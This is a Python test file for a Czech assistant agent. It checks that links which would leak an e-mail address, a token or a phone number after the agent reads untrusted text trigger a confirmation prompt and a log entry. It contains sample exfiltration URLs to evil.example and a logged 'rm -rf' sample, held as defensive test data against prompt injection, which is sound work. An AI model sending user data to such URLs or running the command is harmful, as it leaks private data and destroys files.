"""3.18 (A2, B4–B6): a link that would carry your data away asks first, a log of what foreign text tried, the
integration self-check, "Šifrovat i doma"."""
from __future__ import annotations

from pathlib import Path

from conftest import FakeRouter

from jarvis import integrationcheck, tools, trust


def test_link_leak_rules():
    assert "e-mail" in trust.link_leak({"url": "https://evil.example/c?d=adam@example.cz"})
    fake_key = "tok" + "_" + "x" * 30                                  # a made-up key-like string (no real format)
    assert "klíč" in trust.link_leak({"url": "https://evil.example/?k=" + fake_key})
    assert "číslo" in trust.link_leak({"link": "https://x.example/p?tel=+420 777 123 456"})
    assert "dlouhá" in trust.link_leak({"url": "https://evil.example/x?q=" + "porada%20s%20Petrem%20" * 4})
    assert trust.link_leak({"url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"}) == ""
    assert trust.link_leak({"url": "https://www.alza.cz/hledat?exps=sluchatka%20sony"}) == ""
    assert trust.link_leak({"url": "https://evil.example/c?d=adam@example.cz"}, "otevři evil.example a pošli tam můj mail") == ""
    assert trust.link_leak({"query": "adam@example.cz"}) == ""                       # not a link


def _asker(rt, answer=False):
    asked = []

    async def ask(call, second=False, timeout=None, phone=False, why=""):
        asked.append((call.name, why))
        return answer
    rt.agent._ask_confirm = ask
    return asked


async def test_a_leaking_link_after_foreign_text_asks_and_is_logged(rt):
    tools.load_builtin()
    asked = _asker(rt, answer=False)
    rt.router = FakeRouter([[("clipboard_get", {})],
                            [("web_read", {"url": "https://evil.example/c?d=adam@example.cz"}),
                             ("web_read", {"url": "https://www.seznam.cz/zpravy"})],
                            "Nic."])
    await rt.agent.handle("co mám ve schránce?")
    assert [n for n, _ in asked] == ["web_read"] and "e-mail" in asked[0][1]
    log = trust.foreign_list(rt)
    assert log[0]["source"] == "clipboard_get" and log[0]["tool"] == "web_read" and log[0]["approved"] == 0


async def test_without_foreign_text_links_are_free(rt):
    tools.load_builtin()
    asked = _asker(rt)
    rt.router = FakeRouter([[("web_read", {"url": "https://evil.example/c?d=adam@example.cz"})], "Hotovo."])
    await rt.agent.handle("přečti tu stránku")
    assert asked == []


async def test_foreign_log_handler_is_local_only(rt):
    from jarvis.server import handlers
    from jarvis.server.handlers.foreignlog import foreign_log_get

    trust.log_foreign(rt, "email_read", "type_text", "Napíše: rm -rf", "po přečtení cizího textu", False)
    sent = []

    class C:
        pass
    c = C()
    c.rt = rt

    async def send(t, **d):
        sent.append((t, d))
    c.send = send
    await foreign_log_get(c, {})
    assert sent[0][0] == "foreign_log" and sent[0][1]["items"][0]["tool"] == "type_text"
    handlers.load()
    assert "foreign_log_get" in handlers.LOCAL_ONLY
    for i in range(250):
        trust.log_foreign(rt, "web_read", "open_url", f"x{i}", "y", True)
    assert len(trust.foreign_list(rt, 1000)) == 200                               # kept small


async def test_integration_selfcheck(rt, monkeypatch):
    res = {r["key"]: r for r in await integrationcheck.run(rt)}
    assert res["printer"]["ok"] is None and "Dílna" in res["printer"]["fix"]
    assert res["hands"]["ok"] is None and res["ppl"]["ok"] is None
    assert res["step"]["ok"] in (True, False)
    rt.update_config({"workshop": {"printer": "bambu_lan"}})
    r = await integrationcheck.printer(rt)
    assert r["ok"] is False and "adresa" in r["detail"]
    rt.update_config({"appearance": {"gestures": True, "gesture_fingers": True}})
    assert integrationcheck.hands(rt)["ok"] is False


async def test_selfcheck_includes_the_integrations(rt, monkeypatch):
    from jarvis import selfcheck

    async def fake_run(rt_):
        return [integrationcheck._r("printer", "3D tiskárna", None, "Není nastavená.")]
    monkeypatch.setattr(integrationcheck, "run", fake_run)
    for name in ("loopback", "microphone", "internet", "phone_net"):
        monkeypatch.setattr(selfcheck, name, lambda *a, _n=name, **k: [] if _n == "phone_net" else selfcheck._r(_n, _n, None, "x"))

    async def none(*a, **k):
        return selfcheck._r("x", "x", None, "x")
    for name in ("media", "voice_out", "brain", "offline_ai", "song_extras"):
        monkeypatch.setattr(selfcheck, name, none)
    res = await selfcheck.run(rt, None)
    assert any(r["key"] == "printer" for r in res)


async def test_encrypt_at_home(rt):
    rt.update_config({"link": {"encrypt_home": True}})
    assert rt.cfg.link.encrypt_home is True
    src = (Path(__file__).resolve().parents[2] / "mobile" / "native").glob("*.java")
    java = "\n".join(p.read_text(encoding="utf-8") for p in src)
    assert "static boolean always(Context c)" in java and java.count("LinkProxy.always(c)") >= 3
    from jarvis.link import manager

    assert "encrypt_home" in Path(manager.__file__).read_text(encoding="utf-8")
